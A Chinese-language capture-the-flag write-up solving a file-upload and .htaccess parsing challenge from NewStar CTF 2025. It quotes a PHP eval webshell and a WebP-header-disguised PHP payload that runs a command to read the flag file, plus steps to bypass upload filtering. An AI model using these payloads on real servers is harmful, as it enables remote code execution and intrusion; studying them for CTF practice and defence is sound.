---
title: 'NewStar CTF 2025 Week3-mirror_gate题解文件解析+上传漏洞'
abbrlink: b9e707f6
categories: 
  - ctf题解/web
date: 2026-03-21 21:19:15
---# NewStar CTF 2025 Week3-mirror_gate题解文件解析+上传漏洞

## 0x01 题目：文件上传解析漏洞

---

## 0x02 思路：

若是文件上传就要注意就算文件后缀过了，但是文件内容的恶意代码也会被识破

<?php @eval($_POST['cmd']); ?>这种木马肯定不行，用

```
RIFFWEBPVP8<?=`cat /f*`; ?>
```

但是一开始我的思路并不是直接文件上传，我先看了一眼源代码

![image-20260321210338296](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260321210345510.png)



发现提示

![image-20260321210717128](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260321210717208.png)

base64解码得到：

![image-20260321210807182](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260321210807281.png)

去看一眼这个/uploads/

得到

![image-20260321210913601](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260321210913691.png)



那还说什么，肯定有东西啊，dirsearch开扫

![image-20260321210951410](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260321210951509.png)

很奇怪，一开始上传.htaccess的时候是被过滤掉的

打开/uploads/.htaccess

![image-20260321211045485](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260321211045556.png)

啥意思：意思就是凡是.`webp结尾`的文件我们php都会把它当作`.php`的文件解析

一开始我试了flag.webp，发现还是不行

还有种思路，重新上传webp结尾的木马

---

### 温馨提示：

1.加个文件头别忘记，因为你不加他还是不让你上传成功

2.因为它自身的.htaccess文件，导致你上传抓包时是有些语句冗余的（会导致他把你的木马当作普通文件解析了），删掉即可，如图改请求包

---

## 0x03 步骤：

1.上传木马

```
RIFFWEBPVP8<?=`cat /f*`; ?>
```

2.打开即可

![image-20260321210631186](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260321210631388.png)